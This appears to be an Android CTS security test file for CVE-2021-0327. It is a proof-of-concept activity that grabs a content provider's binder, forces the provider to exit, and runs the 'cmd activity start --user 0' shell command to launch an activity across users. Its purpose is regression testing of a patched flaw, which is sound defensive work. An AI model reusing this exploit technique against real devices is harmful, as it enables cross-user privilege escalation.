package android.security.cts.CVE_2021_0327;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.os.ResultReceiver;
import android.view.View;
import android.util.Log;
import java.io.File;
import java.io.FileDescriptor;
import java.io.*;
import java.util.stream.Collectors;
import java.util.concurrent.TimeUnit;
import android.os.SystemClock;

public class OtherUserActivity extends Activity {

    static ParcelFileDescriptor sTakenBinder;
    private static final String TAG = "CVE_2021_0327";
    String errorMessage = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        doMakeProviderBad(null);
        SystemClock.sleep(5000);
        doStuff(null);
    }

    public void doMakeProviderBad(View view) {
        new MakeProviderBad().execute();
    }

    private class MakeProviderBad extends AsyncTask<Void, Void, Exception> {

        @Override
        protected Exception doInBackground(Void... voids) {
            try {
                if (sTakenBinder != null) {
                    sTakenBinder.close();
                    sTakenBinder = null;
                }

                Uri uri = getIntent().getClipData().getItemAt(0).getUri();
                Bundle callResult = getContentResolver().call(uri, "get_aidl", null, null);
                IBadProvider iface = IBadProvider.Stub.asInterface(callResult.getBinder("a"));
                sTakenBinder = iface.takeBinder();
                if (sTakenBinder == null) {
                    throw new Exception("Failed to find binder of provider");
                }
                iface.exit();
            } catch (Exception e) {
                errorMessage = errorMessage==null ? e.toString() : errorMessage + ", " + e.toString();
            }

            return null;
        }

        @Override
        protected void onPostExecute(Exception e) {
        }
    }

    public void doStuff(View view) {
      sendCommand("start", "--user", "0", "-d", "content://android.security.cts.CVE_2021_0327.BadProvider", "-n", "android.security.cts/.CVE_2021_0327.TestActivity");
    }

    @SuppressLint("PrivateApi")
    void sendCommand(String... args) {
      String[] command = new String[args.length + 2];
      command[0] = "/system/bin/cmd";
      command[1] = "activity";
      System.arraycopy(args, 0, command, 2, args.length);

      try{
       Runtime.getRuntime().exec(command);
      } catch(Exception e){
        errorMessage = errorMessage==null ? e.toString() : errorMessage + ", " + e.toString();
      }
      finally{
        synchronized(CVE_2021_0327.class){
          CVE_2021_0327.testActivityRequested=true;
          CVE_2021_0327.errorMessage = errorMessage;
          CVE_2021_0327.class.notifyAll();
        }
      }
    }
}
